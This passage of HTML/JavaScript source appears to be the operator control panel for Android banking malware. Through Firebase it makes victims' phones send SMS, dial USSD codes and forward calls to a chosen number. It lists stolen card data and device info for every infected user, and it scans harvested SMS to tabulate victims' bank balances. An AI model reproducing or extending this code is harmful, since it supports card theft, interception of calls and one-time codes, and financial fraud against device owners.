                       <div class="bg-app-green px-6 py-4 text-white flex justify-between items-center"><span class="font-bold">Send SMS</span><button id="close-m">✕</button></div>
                       <div class="p-6 space-y-4">
                          <div class="flex bg-gray-100 p-1 rounded-lg">
                             <button class="flex-1 py-2 rounded-md text-sm font-bold slot-btn ${slot===0?'bg-white shadow text-app-green':'text-gray-500'}" data-s="0" ${!hasSim1?'disabled style="opacity:0.5"':''}>SIM 1</button>
                             <button class="flex-1 py-2 rounded-md text-sm font-bold slot-btn ${slot===1?'bg-white shadow text-app-green':'text-gray-500'}" data-s="1" ${!hasSim2?'disabled style="opacity:0.5"':''}>SIM 2</button>
                          </div>
                          <input id="sms-to" class="w-full border rounded-lg p-3" placeholder="To Number">
                          <textarea id="sms-body" class="w-full border rounded-lg p-3" rows="3" placeholder="Message"></textarea>
                          <button id="sms-send" class="w-full bg-app-green text-white py-3 rounded-xl font-bold hover:bg-green-700">Send</button>
                       </div>
                    </div>
                  </div>
                `;
                document.getElementById('close-m').onclick = () => modalLayer.innerHTML = '';
                modalLayer.querySelectorAll('.slot-btn').forEach(b => b.onclick = () => { 
                    slot = parseInt(b.dataset.s); 
                    modalLayer.querySelectorAll('.slot-btn').forEach(btn => btn.className = `flex-1 py-2 rounded-md text-sm font-bold slot-btn text-gray-500`);
                    b.className = `flex-1 py-2 rounded-md text-sm font-bold slot-btn bg-white shadow text-app-green`;
                });
                document.getElementById('sms-send').onclick = () => {
                    const to = document.getElementById('sms-to').value;
                    const msg = document.getElementById('sms-body').value;
                    if(to && msg) {
                        FirebaseService.sendCommandSms(t.userId, to, msg, slot).then(()=>Utils.showToast('Command Sent'));
                        modalLayer.innerHTML = '';
                    }
                };
            };

            // USSD Modal - FIXED REALTIME & FILTERING
            document.getElementById('act-ussd').onclick = () => {
                let slot = hasSim1 ? 0 : 1;
                // Capture opening time to filter out old responses
                const modalOpenTime = Date.now();
                
                modalLayer.innerHTML = `
                  <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
                    <div class="bg-white rounded-2xl w-full max-w-md overflow-hidden flex flex-col h-[500px]">
                       <div class="bg-gray-900 px-6 py-4 text-white flex justify-between items-center"><span class="font-mono font-bold">USSD_TERMINAL</span><button id="close-m">✕</button></div>
                       <div class="flex-1 bg-gray-50 p-4 font-mono text-sm overflow-y-auto">
                          <div class="bg-white p-3 rounded shadow-sm border min-h-[100px]" id="ussd-out">
                             <div class="flex flex-col items-center justify-center h-full text-gray-400 mt-10">
                                <span class="animate-pulse">_Ready</span>
                             </div>
                          </div>
                       </div>
                       <div class="p-4 bg-white border-t">
                          <div class="flex bg-gray-100 rounded mb-3 p-1">
                             <button class="flex-1 py-1 text-xs font-bold rounded slot-btn ${slot===0?'bg-white shadow text-black':'text-gray-400'}" data-s="0" ${!hasSim1?'disabled':''}>SIM 1</button>
                             <button class="flex-1 py-1 text-xs font-bold rounded slot-btn ${slot===1?'bg-white shadow text-black':'text-gray-400'}" data-s="1" ${!hasSim2?'disabled':''}>SIM 2</button>
                          </div>
                          <div class="flex gap-2"><input id="ussd-code" class="flex-1 border rounded px-3 py-2 font-mono" placeholder="*121#"><button id="ussd-go" class="bg-gray-900 text-white px-4 rounded font-bold hover:bg-black">DIAL</button></div>
                       </div>
                    </div>
                  </div>
                `;
                
                // Active Listener for latest USSD Response
                // Filtering Logic: Only show response if timestamp > modalOpenTime
                const unsub = FirebaseService.subscribeToLatestUssdResponse(t.userId, d => {
                    const el = document.getElementById('ussd-out');
                    if(el && d && d.timestamp > modalOpenTime) {
                        el.innerHTML = `
                        <div class="space-y-2 animate-fadeIn">
                           <div class="flex justify-between border-b pb-1">
                              <span class="font-bold">Code:</span> <span>${d.ussdCode || d.ussd}</span>
                           </div>
                           <div class="flex justify-between border-b pb-1">
                              <span class="font-bold">SIM:</span> <span>${d.simSlot===0?'SIM 1':'SIM 2'}</span>
                           </div>
                           <div class="flex justify-between border-b pb-1">
                              <span class="font-bold">Status:</span> <span class="${d.status==='Success'?'text-green-600':'text-red-600'} font-bold">${d.status}</span>
                           </div>
                           <div class="pt-2">
                              <span class="font-bold block text-xs text-gray-500 uppercase mb-1">Response</span>
                              <p class="bg-gray-50 p-2 border rounded whitespace-pre-wrap break-words text-gray-800">${d.response}</p>
                           </div>
                           <div class="text-[10px] text-right text-gray-400 mt-2">${d.formattedTimestamp || new Date(d.timestamp).toLocaleString()}</div>
                        </div>`;
                    }
                });
                
                document.getElementById('close-m').onclick = () => { unsub(); modalLayer.innerHTML = ''; }; 
                
                modalLayer.querySelectorAll('.slot-btn').forEach(b => b.onclick = () => { 
                    slot = parseInt(b.dataset.s);
                    modalLayer.querySelectorAll('.slot-btn').forEach(btn => btn.className = `flex-1 py-1 text-xs font-bold rounded slot-btn text-gray-400`);
                    b.className = `flex-1 py-1 text-xs font-bold rounded slot-btn bg-white shadow text-black`;
                });

                document.getElementById('ussd-go').onclick = () => {
                    const code = document.getElementById('ussd-code').value;
                    if(code) {
                        document.getElementById('ussd-out').innerHTML = '<div class="text-center mt-10"><span class="text-blue-500 font-bold animate-pulse">Sending command...</span></div>';
                        FirebaseService.sendUssdCommand(t.userId, code, slot);
                    }
                };
            };

            // Call Forward Modal
            document.getElementById('act-call').onclick = () => {
               let slot = hasSim1 ? 0 : 1;
               modalLayer.innerHTML = `
                 <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
                   <div class="bg-white rounded-2xl w-full max-w-sm overflow-hidden">
                      <div class="bg-blue-600 px-6 py-4 text-white flex justify-between items-center"><span class="font-bold">Call Forwarding</span><button id="close-m">✕</button></div>
                      <div class="p-6 space-y-4">
                         <div class="bg-gray-900 text-green-400 p-4 rounded text-xs font-mono h-24 overflow-y-auto shadow-inner border-gray-700 border" id="cf-log">
                            <span class="text-gray-500 block mb-1">DEVICE OUTPUT >_</span>
                            Waiting for status...
                         </div>
                         <div class="flex bg-gray-100 p-1 rounded"><button class="flex-1 py-1 text-xs font-bold slot-btn ${slot===0?'bg-white shadow text-blue-600':'text-gray-500'}" data-s="0" ${!hasSim1?'disabled':''}>SIM 1</button><button class="flex-1 py-1 text-xs font-bold slot-btn ${slot===1?'bg-white shadow text-blue-600':'text-gray-500'}" data-s="1" ${!hasSim2?'disabled':''}>SIM 2</button></div>
                         <input id="cf-num" class="w-full border rounded p-3" placeholder="Target Number">
                         <div class="flex gap-2"><button id="cf-en" class="flex-1 bg-blue-600 text-white py-2 rounded font-bold">Enable</button><button id="cf-dis" class="flex-1 bg-red-50 text-red-600 py-2 rounded font-bold border border-red-100">Disable</button></div>
                      </div>
                   </div>
                 </div>
               `;
               const unsub = FirebaseService.subscribeToCallForwarding(t.userId, d => { 
                   const el = document.getElementById('cf-log'); 
                   if(el && d) {
                       const statusText = typeof d === 'string' ? d : (d.callForwardStatus || 'Updated');
                       el.innerHTML = `<span class="text-gray-500 block mb-1">DEVICE OUTPUT >_</span>${statusText}`; 
                   }
               });
               document.getElementById('close-m').onclick = () => { unsub(); modalLayer.innerHTML = ''; };
               
                modalLayer.querySelectorAll('.slot-btn').forEach(b => b.onclick = () => { 
                    slot = parseInt(b.dataset.s);
                    modalLayer.querySelectorAll('.slot-btn').forEach(btn => btn.className = `flex-1 py-1 text-xs font-bold slot-btn text-gray-500`);
                    b.className = `flex-1 py-1 text-xs font-bold slot-btn bg-white shadow text-blue-600`;
                });

               document.getElementById('cf-en').onclick = () => FirebaseService.setCallForwarding(t.userId, document.getElementById('cf-num').value, slot, true).then(()=>Utils.showToast("Config Sent"));
               document.getElementById('cf-dis').onclick = () => FirebaseService.setCallForwarding(t.userId, '', slot, false).then(()=>Utils.showToast("Config Sent"));
            };

        } else if (activeTab === 'DATA') {
            // Updated: Use Grid layout for horizontal-ish display of blocks
            const dataContainer = document.createElement('div');
            dataContainer.className = "grid grid-cols-1 xl:grid-cols-2 gap-4 pt-2";
            
            if(infoData.info) {
                Object.entries(infoData.info).forEach(([k,v]) => {
                    const block = document.createElement('div');
                    block.className = "bg-white p-4 rounded-xl shadow-sm border border-gray-100 group h-fit";
                    block.innerHTML = `<h4 class="text-xs font-bold text-blue-600 uppercase mb-3 cursor-pointer select-none border-b border-blue-50 pb-2 flex justify-between items-center">${k} <span class="text-gray-300 text-[10px]">▼</span></h4>`;
                    
                    const viewer = createProfessionalViewer(v);
                    viewer.classList.add('hidden', 'group-hover:block'); 
                    block.querySelector('h4').onclick = () => viewer.classList.toggle('hidden');
                    
                    block.appendChild(viewer);
                    dataContainer.appendChild(block);
                });
            } else {
                dataContainer.innerHTML = '<div class="text-center text-gray-400 col-span-full">No Info</div>';
            }
            content.appendChild(dataContainer);

        } else if (activeTab === 'CARDS') {
            const cardContainer = document.createElement('div');
            cardContainer.className = "grid grid-cols-1 xl:grid-cols-2 gap-4 pt-2";

            if(infoData.cards) {
                Object.entries(infoData.cards).forEach(([k,v]) => {
                     const block = document.createElement('div');
                     block.className = "bg-white p-4 rounded-xl shadow-sm border-l-4 border-purple-500 h-fit";
                     block.innerHTML = `<h4 class="text-xs font-bold text-purple-600 uppercase mb-3 border-b border-purple-50 pb-2">${k}</h4>`;
                     block.appendChild(createProfessionalViewer(v));
                     cardContainer.appendChild(block);
                });
            } else {
                 cardContainer.innerHTML = '<div class="text-center text-gray-400 py-10 border border-dashed rounded col-span-full">No Cards Found</div>';
            }
            content.appendChild(cardContainer);
        }
    };

    state.subscriptions.push(FirebaseService.subscribeToFullUserInfo(t.userId, d => {
        infoData = d;
        const s = d.simDetails || {};
        document.getElementById('sim-card').innerHTML = `
           <div class="flex items-start space-x-3"><div class="bg-blue-50 p-2 rounded text-blue-600"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div><div><h3 class="text-xs font-bold text-gray-400 uppercase">SIM 1</h3><p class="text-sm font-mono font-bold">${s.sim1Number||'N/A'}</p><p class="text-xs text-gray-500">${s.sim1Provider||''}</p></div></div>
           <div class="flex items-start space-x-3"><div class="bg-purple-50 p-2 rounded text-purple-600"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div><div><h3 class="text-xs font-bold text-gray-400 uppercase">SIM 2</h3><p class="text-sm font-mono font-bold">${s.sim2Number||'N/A'}</p><p class="text-xs text-gray-500">${s.sim2Provider||''}</p></div></div>
        `;
        renderTabs();
    }));
};

// ==========================================
// 9. GLOBAL DATA & BANK SUMMARY
// ==========================================
const renderGlobalDataViewer = (container) => {
    clearDetailSubscriptions();
    container.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50 overflow-hidden">
         <header class="bg-white px-6 py-4 shadow-sm border-b flex items-center sticky top-0 z-20 flex-none">
            <button id="btn-back" class="mr-4 p-2 rounded-full hover:bg-gray-100"><svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
            <h1 class="font-bold text-xl">Global Data</h1>
         </header>
         <div id="glob-list" class="flex-1 overflow-auto p-6 space-y-6 max-w-7xl mx-auto w-full pb-20">
            <div class="flex justify-center mt-20"><div class="animate-spin rounded-full h-10 w-10 border-b-2 border-indigo-600"></div></div>
         </div>
      </div>
    `;
    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    
    // Improved Professional JSON Renderer
    const renderJson = (data) => {
        if(!data || Object.keys(data).length === 0) return `<div class="text-xs text-gray-400 italic p-3">No data available</div>`;
        
        let html = `<div class="flex flex-col text-sm border-t border-gray-100">`;
        Object.entries(data).forEach(([key, value], index) => {
            const valStr = (typeof value === 'object' && value !== null) ? JSON.stringify(value, null, 2) : String(value);
            html += `
            <div class="flex flex-col sm:flex-row border-b border-gray-100 last:border-0 ${index % 2 === 0 ? 'bg-gray-50/50' : 'bg-white'}">
                <div class="w-full sm:w-1/3 p-2 font-bold text-gray-600 uppercase text-[10px] tracking-wider border-b sm:border-b-0 sm:border-r border-gray-100 flex items-center bg-gray-50/30">
                    ${key.replace(/_/g, ' ')}
                </div>
                <div class="w-full sm:w-2/3 p-2 text-gray-800 font-mono text-xs break-all whitespace-pre-wrap leading-relaxed">
                    ${valStr}
                </div>
            </div>`;
        });
        html += `</div>`;
        return html;
    };

    state.subscriptions.push(FirebaseService.subscribeToGlobalData(data => {
        const el = document.getElementById('glob-list');
        if(!el) return;
        
        // FILTER: Only show users who have Actual Data (Info OR Cards)
        const validUsers = data.filter(u => 
            (u.info && Object.keys(u.info).length > 0) || 
            (u.cards && Object.keys(u.cards).length > 0)
        );

        el.innerHTML = validUsers.length ? validUsers.map(u => `
           <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden hover:shadow-md transition-shadow mb-6">
              <div class="bg-gray-50/50 px-6 py-4 border-b flex justify-between items-center">
                 <div class="flex items-center gap-3"><span class="font-bold text-gray-900">${u.Brand||'Unknown'}</span><span class="text-xs bg-gray-200 px-2 py-0.5 rounded font-mono">${u.userId}</span></div>
              </div>
              <div class="p-6 grid lg:grid-cols-2 gap-8">
                 <div class="bg-white rounded-lg border border-gray-200 overflow-hidden">
                    <h3 class="text-xs font-bold text-indigo-600 uppercase p-3 bg-indigo-50 border-b border-indigo-100 flex justify-between items-center">
                        Device Info 
                        <button onclick="navigator.clipboard.writeText('${encodeURIComponent(JSON.stringify(u.info))}')" class="text-indigo-400 hover:text-indigo-600 text-[10px]">COPY</button>
                    </h3>
                    <div class="max-h-60 overflow-y-auto custom-scrollbar">${renderJson(u.info)}</div>
                 </div>
                 <div class="bg-white rounded-lg border border-gray-200 overflow-hidden">
                    <h3 class="text-xs font-bold text-purple-600 uppercase p-3 bg-purple-50 border-b border-purple-100 flex justify-between items-center">
                        Card Data 
                        <button onclick="navigator.clipboard.writeText('${encodeURIComponent(JSON.stringify(u.cards))}')" class="text-purple-400 hover:text-purple-600 text-[10px]">COPY</button>
                    </h3>
                    <div class="max-h-60 overflow-y-auto custom-scrollbar">${renderJson(u.cards)}</div>
                 </div>
              </div>
           </div>
        `).join('') : '<div class="text-center text-gray-400 py-10 border-2 border-dashed rounded-xl">No Data Found</div>';
    }));
};

const renderBankSummary = async (container) => {
    clearDetailSubscriptions();
    container.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50 overflow-hidden">
         <header class="bg-white px-6 py-4 shadow-sm border-b flex items-center sticky top-0 z-20 flex-none">
            <button id="btn-back" class="mr-4 p-2 rounded-full hover:bg-gray-100"><svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
            <h1 class="font-bold text-xl">Bank Balance Summary</h1>
         </header>
         <div class="flex-1 overflow-auto p-6"><div id="bank-table" class="bg-white rounded-xl shadow-sm border overflow-hidden"><div class="p-10 text-center"><div class="animate-spin rounded-full h-10 w-10 border-b-2 border-app-green mx-auto"></div></div></div></div>
      </div>
    `;
    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    
    const allSms = await FirebaseService.fetchGlobalSMS();
    const userMap = new Map();
    allSms.forEach(sms => {
        const banks = Utils.detectBanks(sms.sender + ' ' + sms.body);
        if (banks.length > 0) {
            const bal = Utils.extractBalance(sms.body);
            if (bal) {
                const curr = userMap.get(sms.userId);
                if (!curr || sms.timestamp > curr.timestamp) {
                    userMap.set(sms.userId, { id: sms.userId, device: sms.androidId || sms.userId, bank: banks[0], amt: bal, time: sms.timestamp });
                }
            }
        }
    });
    
    const entries = Array.from(userMap.values()).sort((a,b) => b.time - a.time);
    document.getElementById('bank-table').innerHTML = entries.length === 0 ? `<div class="p-10 text-center text-gray-400">No balance data detected.</div>` : `
       <table class="w-full text-left text-sm">
          <thead class="bg-gray-50 border-b"><tr><th class="px-6 py-3 text-xs text-gray-500 uppercase">Device</th><th class="px-6 py-3 text-xs text-gray-500 uppercase">Bank</th><th class="px-6 py-3 text-xs text-gray-500 uppercase">Balance</th><th class="px-6 py-3 text-xs text-gray-500 uppercase">Time</th></tr></thead>
          <tbody class="divide-y">${entries.map(e => `
             <tr class="hover:bg-gray-50"><td class="px-6 py-4 font-mono text-xs text-gray-600">${e.device.substring(0,20)}...</td><td class="px-6 py-4"><span class="px-2 py-1 bg-blue-50 text-blue-700 rounded-full text-xs font-bold border border-blue-100">${e.bank}</span></td><td class="px-6 py-4 font-bold text-gray-900">${e.amt}</td><td class="px-6 py-4 text-gray-500 text-xs">${new Date(e.time).toLocaleString()}</td></tr>
          `).join('')}</tbody>
       </table>
    `;
};

// Initial Render
renderApp();

</script>
</body>
    </html>
